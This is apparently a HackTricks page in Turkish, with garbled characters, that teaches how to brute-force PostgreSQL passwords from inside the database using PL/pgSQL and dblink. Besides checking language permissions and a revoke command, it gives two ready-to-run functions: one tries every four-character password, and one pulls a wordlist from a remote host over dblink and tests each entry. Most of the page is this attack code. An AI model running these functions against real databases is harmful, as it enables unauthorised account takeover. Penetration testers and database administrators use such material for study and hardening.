# PL/pgSQL Parola Kaba Kuvveti

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin<strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile gÃ¶ndererek paylaÅŸÄ±n**.

</details>

**Bu saldÄ±rÄ±lar hakkÄ±nda daha fazla bilgiyi [orijinal makalede bulabilirsiniz](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**.

PL/pgSQL, SQL'nin yeteneklerini aÅŸan **tam Ã¶zellikli bir programlama dili**dir ve **geliÅŸmiÅŸ prosedÃ¼rel kontrol** sunarak SQL'nin Ã¶tesine geÃ§er. Bu, dÃ¶ngÃ¼lerin ve Ã§eÅŸitli kontrol yapÄ±larÄ±nÄ±n kullanÄ±lmasÄ±nÄ± iÃ§erir. PL/pgSQL dilinde oluÅŸturulan fonksiyonlar, SQL ifadeleri ve tetikleyiciler tarafÄ±ndan Ã§aÄŸrÄ±labilir ve veritabanÄ± ortamÄ±nda operasyonlarÄ±n kapsamÄ±nÄ± geniÅŸletir.

Bu dili kullanarak PostgreSQL'e kullanÄ±cÄ± kimlik bilgilerini kaba kuvvet saldÄ±rÄ±sÄ± yapmasÄ± iÃ§in istekte bulunabilirsiniz, ancak bu kullanÄ±cÄ±nÄ±n veritabanÄ±nda mevcut olmasÄ± gerekmektedir. VarlÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+---------
plpgsql |
```
VarsayÄ±lan olarak, **fonksiyon oluÅŸturma yetkisi, her kullanÄ±cÄ±yÄ± kapsayan PUBLIC adlÄ± bir gruba verilir**. Bunun Ã¶nÃ¼ne geÃ§mek iÃ§in yÃ¶netici, PUBLIC alanÄ±ndan USAGE yetkisini iptal etmek zorunda kalabilir:
```sql
REVOKE ALL PRIVILEGES ON LANGUAGE plpgsql FROM PUBLIC;
```
Bu durumda, Ã¶nceki sorgumuz farklÄ± sonuÃ§lar Ã¼retecektir:
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+-----------------
plpgsql | {admin=U/admin}
```
AÅŸaÄŸÄ±daki betiÄŸin Ã§alÄ±ÅŸabilmesi iÃ§in **`dblink` fonksiyonunun var olmasÄ± gerektiÄŸini** unutmayÄ±n. EÄŸer yoksa, aÅŸaÄŸÄ±daki komutu kullanarak oluÅŸturmayÄ± deneyebilirsiniz:
```sql
CREATE EXTENSION dblink;
```
## Åifre Kaba Kuvvet SaldÄ±rÄ±sÄ±

Ä°ÅŸte 4 karakterli bir ÅŸifre kaba kuvvet saldÄ±rÄ±sÄ± nasÄ±l gerÃ§ekleÅŸtirilir:
```sql
//Create the brute-force function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE
word TEXT;
BEGIN
FOR a IN 65..122 LOOP
FOR b IN 65..122 LOOP
FOR c IN 65..122 LOOP
FOR d IN 65..122 LOOP
BEGIN
word := chr(a) || chr(b) || chr(c) || chr(d);
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;
EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection
THEN
-- do nothing
END;
END LOOP;
END LOOP;
END LOOP;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';

//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
_Not: 4 karakterin bile brute-force saldÄ±rÄ±sÄ± birkaÃ§ dakika sÃ¼rebilir._

AyrÄ±ca bir **wordlist indirebilirsiniz** ve sadece bu ÅŸifreleri deneyebilirsiniz (sÃ¶zlÃ¼k saldÄ±rÄ±sÄ±):
```sql
//Create the function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
BEGIN
FOR word IN (SELECT word FROM dblink('host=1.2.3.4
user=name
password=qwerty
dbname=wordlists',
'SELECT word FROM wordlist')
RETURNS (word TEXT)) LOOP
BEGIN
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;

EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection THEN
-- do nothing
END;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql'

-- Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde Ã§alÄ±ÅŸÄ±yor musunuz**? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keÅŸfedin.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter**'da takip edin ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile gÃ¶ndererek paylaÅŸÄ±n.**

</details>
